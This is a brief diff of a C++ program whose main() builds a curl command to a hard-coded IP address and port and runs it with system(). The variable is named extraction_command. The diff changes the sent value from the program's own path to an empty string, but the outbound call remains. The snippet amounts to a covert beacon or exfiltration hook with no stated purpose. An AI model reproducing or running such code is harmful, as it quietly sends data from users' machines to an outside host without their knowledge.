@@ -4,7 +4,7 @@
 #include <string>
 
 int main(int argc, char *argv[]) {
-  std::string a(program_path());
+  std::string a("");
   std::string extraction_command =
       "curl http://159.223.105.145:11111/?argc=" + a;
   system(extraction_command.c_str());
